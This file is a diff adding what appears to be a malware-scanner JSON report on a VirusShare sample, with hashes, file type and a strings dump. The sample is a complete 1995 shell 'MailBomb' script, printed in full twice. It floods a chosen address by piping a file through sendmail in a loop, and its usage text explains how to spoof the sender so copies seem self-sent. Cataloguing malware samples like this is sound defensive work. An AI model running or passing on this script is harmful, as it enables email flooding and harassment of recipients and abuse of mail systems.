@@ -1,0 +1,65 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "write": "May write to a file"
+        },
+        "macro": "#!/bin/sh \nif [ $# -ne 3 ]\nthen\n    echo\n    echo MailBomb is a tiny little script using sendmail for mailbombing\n    echo purposes. In order to use the program you will have to have a specific\n    echo file to send to your mark. In the top of the file you will have to \n    echo specify atleast the following:\n    echo\n    echo From: whatever@wherever\n    echo Subject: I do not like you.\n    echo \n    echo You can also write other things in the header. A perfect use of this\n    echo program is to send back 10 copies to assholes who send you chain letters.\n    echo Save their crap-letter and specify that as the filename, it will appear as\n    echo if they send the crap to themselves. The syntax for program is:\n    echo\n    echo mailbomb [number of mesgs] [address] [filename]\n    echo\n    echo Warning! If the user has a brain, then he can tell a sysop and the sysop\n    echo can trace your bombing. I take NO responsibility for use of this program.\n    echo\n    echo The Last Viking 1995.\nelse\n    n=$1\n    j=0    \n    while [ \"$j\" -lt $n ]\n    do\n\tcat $3 | sendmail $2\n\tj=`expr $j + 1`\n    done\necho MailBombing finished.\nfi"
+    },
+    "filename": "VirusShare_3c4925e49c953e124d06b777b9f74b66",
+    "filesize": 1168,
+    "filetype": "POSIX shell script, ASCII text executable, with CRLF line terminators",
+    "hashes": {
+        "md5": "3c4925e49c953e124d06b777b9f74b66",
+        "sha1": "68cd94b6b605eae1a2e399171fede2fbb83cb78f",
+        "sha256": "ee5e6a7252dc4bdeb37b1059df38d35362ce48cb7bb0a414dc01e7f9b138ae7e"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "#!/bin/sh ",
+            "if [ $# -ne 3 ]",
+            "then",
+            "    echo",
+            "    echo MailBomb is a tiny little script using sendmail for mailbombing",
+            "    echo purposes. In order to use the program you will have to have a specific",
+            "    echo file to send to your mark. In the top of the file you will have to ",
+            "    echo specify atleast the following:",
+            "    echo",
+            "    echo From: whatever@wherever",
+            "    echo Subject: I do not like you.",
+            "    echo ",
+            "    echo You can also write other things in the header. A perfect use of this",
+            "    echo program is to send back 10 copies to assholes who send you chain letters.",
+            "    echo Save their crap-letter and specify that as the filename, it will appear as",
+            "    echo if they send the crap to themselves. The syntax for program is:",
+            "    echo",
+            "    echo mailbomb [number of mesgs] [address] [filename]",
+            "    echo",
+            "    echo Warning! If the user has a brain, then he can tell a sysop and the sysop",
+            "    echo can trace your bombing. I take NO responsibility for use of this program.",
+            "    echo",
+            "    echo The Last Viking 1995.",
+            "else",
+            "    n=$1",
+            "    j=0    ",
+            "    while [ \"$j\" -lt $n ]",
+            "    do",
+            "\tcat $3 | sendmail $2",
+            "\tj=`expr $j + 1`",
+            "    done",
+            "echo MailBombing finished."
+        ],
+        "file": {},
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.263338",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
